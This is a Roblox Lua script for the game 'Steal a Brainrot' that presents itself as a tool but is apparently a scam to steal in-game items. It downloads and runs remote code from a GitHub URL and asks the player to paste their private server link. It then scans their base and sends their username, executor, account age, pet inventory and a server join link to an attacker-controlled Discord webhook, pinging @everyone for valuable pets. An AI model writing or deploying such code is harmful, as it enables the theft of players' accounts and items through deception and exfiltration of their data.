-- Services
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")

local player = Players.LocalPlayer

-- Load config from GitHub
local config = {}
do
    local ok, res = pcall(function()
        return loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-IDP/tsetging234/refs/heads/main/config"))()
    end)
    if ok and type(res) == "table" then
        config = res
    else
        config = {
            WEBHOOK = "",
            targetNames = {},
            Receiver = {}
        }
    end
end

local WEBHOOK = config.WEBHOOK
local targetNames = config.targetNames or {}
local receiverList = table.concat(config.Receiver or {}, ", ")

-- Executor & account age detection
local function detectExecutor()
    if syn then return "Synapse X"
    elseif KRNL_LOADED then return "KRNL"
    elseif fluxus then return "Fluxus"
    elseif secure_load then return "Sentinel"
    elseif getexecutorname then return getexecutorname()
    elseif identifyexecutor then return identifyexecutor()
    else return "Unknown" end
end

local function getAccountAge()
    return player and player.AccountAge or 0
end

-- Detect server type
local serverType = "UNKNOWN"
local map = Workspace:FindFirstChild("Map")
if map then
    local codes = map:FindFirstChild("Codes")
    local main = codes and codes:FindFirstChild("Main")
    local surfaceGui = main and main:FindFirstChild("SurfaceGui")
    local sFrame = surfaceGui and surfaceGui:FindFirstChild("MainFrame")
    local privateMsg = sFrame and sFrame:FindFirstChild("PrivateServerMessage")
    serverType = (privateMsg and privateMsg.Visible) and "PRIVATE SERVER" or "PUBLIC SERVER"
end

-- Only allow private servers
if serverType == "PUBLIC SERVER" then
    warn("Only use this script in private servers")
    return
end

-- Get priority index for a pet name
local function getPriority(name)
    for i, t in ipairs(targetNames) do
        if t.name and name:find(t.name) then
            return i
        end
    end
    return math.huge
end

local function shuffle(tbl)
    for i = #tbl, 2, -1 do
        local j = math.random(i)
        tbl[i], tbl[j] = tbl[j], tbl[i]
    end
end

-- Scan your base for all pets
local function scanMyBase()
    local found = {}
    local plots = Workspace:FindFirstChild("Plots")
    if not plots then return found end

    for _, plot in ipairs(plots:GetChildren()) do
        local sign = plot:FindFirstChild("PlotSign")
        if sign and sign:FindFirstChild("SurfaceGui") and sign.SurfaceGui:FindFirstChild("Frame") then
            local label = sign.SurfaceGui.Frame:FindFirstChild("TextLabel")
            if label and label.Text:find(player.DisplayName) then
                local podiums = plot:FindFirstChild("AnimalPodiums")
                if podiums then
                    for _, podium in ipairs(podiums:GetChildren()) do
                        local base = podium:FindFirstChild("Base")
                        local spawn = base and base:FindFirstChild("Spawn")
                        local attachment = spawn and spawn:FindFirstChild("Attachment")
                        local overhead = attachment and attachment:FindFirstChild("AnimalOverhead")
                        if overhead then
                            local displayName = overhead:FindFirstChild("DisplayName")
                            local genLabel = overhead:FindFirstChild("Generation")
                            local petName = (displayName and displayName.Text) or "Unknown"
                            local value = (genLabel and genLabel.Text) or "Unknown"

                            local floor = "Unknown Floor"
                            local num = tonumber(podium.Name:match("^(%d+)_?"))
                            if num then
                                if num >= 1 and num <= 10 then floor = "1st Floor"
                                elseif num >= 11 and num <= 18 then floor = "2nd Floor"
                                else floor = "3rd Floor" end
                            end

                            table.insert(found, {name = petName, value = value, floor = floor})
                        end
                    end
                end
                break
            end
        end
    end
    return found
end

-- Send webhook (only if pets exist)
local function sendWebhook(pets)
    if not pets or #pets == 0 then return end
    if player and player:GetAttribute("WebhookSent") then return end

    local priorityPets, normalPets = {}, {}

    for _, pet in ipairs(pets) do
        local prio = getPriority(pet.name)
        local line = string.format("%s → %s → %s", pet.name, pet.value, pet.floor)
        if prio ~= math.huge then
            table.insert(priorityPets, {line = line, priority = prio})
        else
            table.insert(normalPets, line)
        end
    end

    table.sort(priorityPets, function(a,b) return a.priority < b.priority end)

    local orderedLines = {}
    for _, p in ipairs(priorityPets) do table.insert(orderedLines, p.line) end
    for _, n in ipairs(normalPets) do table.insert(orderedLines, n) end

    local lootText = #orderedLines > 0 and table.concat(orderedLines, "\n") or "Empty"
    if lootText == "Empty" then return end

    -- Wrap player info in triple backticks
    local playerInfoText = "```" ..
        "Name: "..(player and player.Name or "Unknown").."\n"..
        "Receiver: "..receiverList.."\n"..
        "Executor: "..detectExecutor().."\n"..
        "Account Age: "..tostring(getAccountAge()).." days"..
        "```"

    -- Wrap pets info in triple backticks
    local petsText = "```"..lootText.."```"

    local placeId = tostring(game.PlaceId or "")
    local jobId = tostring(game.JobId or "")
    local serverLink = ("https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s"):format(placeId, jobId)

    local shouldPing = #priorityPets > 0

    local embed = {
        ["title"] = "🧠 Steal a Brainrot HIT! - bloomscripts",
        ["color"] = 12413107,
        ["fields"] = {
            {["name"]="Players", ["value"]=string.format("%d/6", #Players:GetPlayers())},
            {["name"]="Server Type", ["value"]=serverType},
            {["name"]="👥 Player Info", ["value"]=playerInfoText},
            {["name"]="🧠 Brainrots in Base", ["value"]=petsText},
            {["name"]="Join Server Link", ["value"]=("[Click to Join Server](%s)"):format(serverLink)}
        }
    }

    local payload = {
        ["content"] = shouldPing and "📣 @everyone **High Value Brainrot Detected!**" or "",
        ["embeds"] = {embed},
        ["allowed_mentions"] = {["parse"] = shouldPing and {"everyone"} or {}}
    }

    local req = (syn and syn.request) or http_request or (http and http.request) or request
    if req and WEBHOOK and WEBHOOK ~= "" then
        pcall(function()
            req({
                Url = WEBHOOK,
                Method = "POST",
                Headers = {["Content-Type"]="application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)
        if player then
            player:SetAttribute("WebhookSent", true)
        end
    end
end

--================= GUI FOR PRIVATE SERVER LINK =================--

local playerGui = player:WaitForChild("PlayerGui")
local screenGui = Instance.new("ScreenGui", playerGui)
screenGui.Name = "StealBrainrotGUI"
screenGui.ResetOnSpawn = false

local frame = Instance.new("Frame", screenGui)
frame.Size = UDim2.new(0, 320, 0, 180)
frame.Position = UDim2.new(0.5, -160, 0.5, -90)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)

local title = Instance.new("TextLabel", frame)
title.Text = "Steal a Brainrot"
title.Font = Enum.Font.FredokaOne
title.TextSize = 20
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.BackgroundTransparency = 1
title.Size = UDim2.new(1, 0, 0, 28)
title.Position = UDim2.new(0, 0, 0, 4)

local closeButton = Instance.new("TextButton", frame)
closeButton.Text = "X"
closeButton.Font = Enum.Font.FredokaOne
closeButton.TextSize = 18
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
closeButton.Size = UDim2.new(0, 28, 0, 28)
closeButton.Position = UDim2.new(1, -34, 0, 4)
Instance.new("UICorner", closeButton).CornerRadius = UDim.new(0, 8)
closeButton.MouseButton1Click:Connect(function() screenGui:Destroy() end)

local textBox = Instance.new("TextBox", frame)
textBox.Size = UDim2.new(0.9, 0, 0, 36)
textBox.Position = UDim2.new(0.05, 0, 0, 50)
textBox.PlaceholderText = "Enter your private server link"
textBox.Text = ""
textBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
textBox.ClearTextOnFocus = false
textBox.Font = Enum.Font.FredokaOne
textBox.TextSize = 14
Instance.new("UICorner", textBox).CornerRadius = UDim.new(0, 8)

local statusLabel = Instance.new("TextLabel", frame)
statusLabel.Size = UDim2.new(0.9, 0, 0, 24)
statusLabel.Position = UDim2.new(0.05, 0, 0, 90)
statusLabel.Text = ""
statusLabel.Font = Enum.Font.FredokaOne
statusLabel.TextSize = 14
statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
statusLabel.BackgroundTransparency = 1

local sendButton = Instance.new("TextButton", frame)
sendButton.Text = "Send"
sendButton.Font = Enum.Font.FredokaOne
sendButton.TextSize = 18
sendButton.TextColor3 = Color3.fromRGB(255, 255, 255)
sendButton.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
sendButton.Size = UDim2.new(0.4, 0, 0, 32)
sendButton.Position = UDim2.new(0.3, 0, 0, 120)
Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0, 8)

-- Helper to validate private server links
local function isValidPrivateServerLink(txt)
    return string.match(txt or "", "^https://www%.roblox%.com/share%?code=.+&type=Server$") ~= nil
end

-- Update status dynamically
textBox:GetPropertyChangedSignal("Text"):Connect(function()
    if isValidPrivateServerLink(textBox.Text) then
        statusLabel.Text = "Valid ✅"
        statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
    else
        statusLabel.Text = "Invalid ❌"
        statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    end
end)

-- Send webhook when valid private server is inserted
local function handleSend()
    local txt = textBox.Text or ""
    if isValidPrivateServerLink(txt) then
        screenGui:Destroy()
        task.spawn(function()
            local pets = scanMyBase()
            if #pets > 0 then
                sendWebhook(pets)
            end
        end)
    else
        warn("Invalid private server link!")
    end
end

sendButton.MouseButton1Click:Connect(handleSend)
textBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then handleSend() end
end)
